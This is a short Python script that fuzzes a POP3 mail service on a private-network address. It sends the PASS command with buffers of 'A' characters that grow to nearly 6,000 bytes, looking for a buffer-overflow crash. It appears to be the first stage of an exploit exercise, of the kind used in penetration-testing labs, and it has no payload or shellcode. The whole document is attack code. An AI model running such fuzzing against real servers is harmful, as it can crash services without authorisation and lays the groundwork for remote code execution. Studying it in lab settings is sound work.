#!/usr/bin/python
import socket

RHOST = '192.168.205.185'
RPORT = 110


bufs = []
size = 100
while size < 6000:
  bufs.append(size)
  size += 200

for i in bufs:
  buf = 'A' * i
  try:
    print 'Try connect to POP3...'
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    data = s.recv(1024)
    print data

    print 'USER test'
    s.send('USER test\r\n')
    data = s.recv(1024)
    print data

    print 'PASS {0} bytes'.format(i)
    s.send('PASS ' + buf + '\r\n')
    data = s.recv(1024)
    print data

    print 'QUIT'
    s.send('QUIT\r\n')
    data = s.recv(1024)
    print data

    s.close()
  except:
    print 'Could not connect to POP3!'
